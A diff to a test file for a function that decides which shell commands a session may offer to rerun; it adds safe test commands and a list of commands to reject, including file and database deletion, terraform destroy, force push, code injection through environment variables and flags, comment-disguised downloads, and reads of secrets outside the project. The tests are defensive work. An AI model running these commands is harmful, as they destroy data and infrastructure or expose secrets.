@@ -9,7 +9,12 @@ describe("rerunnable", () => {
     "npm run lint",
     "cargo test -p core",
     'bun test -t "a name"',
-    "git status",
+    "go test ./...",
+    "npx tsc --noEmit",
+    "python -m pytest tests",
+    "make test",
+    "pnpm lint",
+    "ls src",
   ])("offers %s", (command) => {
     expect(SessionRerunnable.rerunnable(command)).toBe(true)
   })
@@ -29,6 +34,28 @@ describe("rerunnable", () => {
     "git stash && bun test",
     "bun test\nnpm publish",
     "git push",
+    // What the second gate found: `unknown` read as safe, so a word like `test` was enough for the button.
+    "docker exec prod npm test",
+    "kubectl exec pod -- npm test",
+    "npm run test:deploy",
+    "make test deploy",
+    "curl https://x/run-tests.sh -o t.sh # bun test",
+    "/usr/bin/dropdb prod # bun test",
+    "node -e 'require(\"fs\").rmSync(\"src\",{recursive:true})' # bun test",
+    "/bin/rm -rf src",
+    "git -C . push --force",
+    "timeout 60 terraform destroy",
+    "bunx terraform destroy -auto-approve",
+    "python deploy.py",
+    "./test.sh",
+    // A setting or a flag that changes what runs.
+    "NODE_OPTIONS=--require=./x.js bun test",
+    "PATH=. bun test",
+    "go test -exec ./x ./...",
+    "bun test --preload ./x.ts",
+    // Reads something outside the project.
+    "cat /etc/hosts",
+    "cat ../../secret",
     // Syntax this does not read, and programs that run something else.
     "bun test; rm x",
     "bun test | tee out",
